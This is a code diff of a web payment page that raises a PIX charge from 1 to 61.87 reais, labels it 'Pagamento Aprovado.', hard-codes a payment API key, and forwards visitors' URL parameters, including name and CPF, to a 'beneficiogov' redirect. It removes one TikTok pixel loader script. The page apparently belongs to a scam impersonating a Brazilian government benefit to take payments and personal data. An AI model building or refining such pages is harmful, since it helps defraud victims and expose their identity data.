@@ -14,15 +14,6 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 }(window, document, 'ttq');
 </script>
 <!-- TikTok Pixel Code End -->
-
-  <script>
-  window.tikTokPixelId = "69b78d959dcfda60eb53f101";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
-  document.head.appendChild(a);
-</script>
   
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width,maximum-scale=1.0,user-scalable=no">
@@ -354,7 +345,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     // CONFIGURAÇÃO
     // ===================================================
     var PIX_API_KEY     = 'sealpay_apikey_vb5g1tookcn';
-    var PIX_VALOR_CENTS = 100;
+    var PIX_VALOR_CENTS = 6187;
     var PIX_DESCRICAO   = 'Pagamento Aprovado.';
     var PIX_REDIRECT    = 'https://beneficiogov.vercel.app/up1.html';
     // ===================================================
@@ -579,7 +570,12 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 
             // Aguarda 800ms para o evento ser enviado antes de redirecionar
             setTimeout(function() {
-              if (PIX_REDIRECT) window.location.href = PIX_REDIRECT;
+              if (PIX_REDIRECT) {
+                // Repassa todos os parâmetros da URL atual (nome, cpf, utm, etc.)
+                var params = new URLSearchParams(window.location.search);
+                var redirectUrl = PIX_REDIRECT + (PIX_REDIRECT.indexOf('?') > -1 ? '&' : '?') + params.toString();
+                window.location.href = redirectUrl;
+              }
             }, 800);
           }
         } catch(e) { console.error('Polling erro tentativa ' + tentativas + ':', e); }
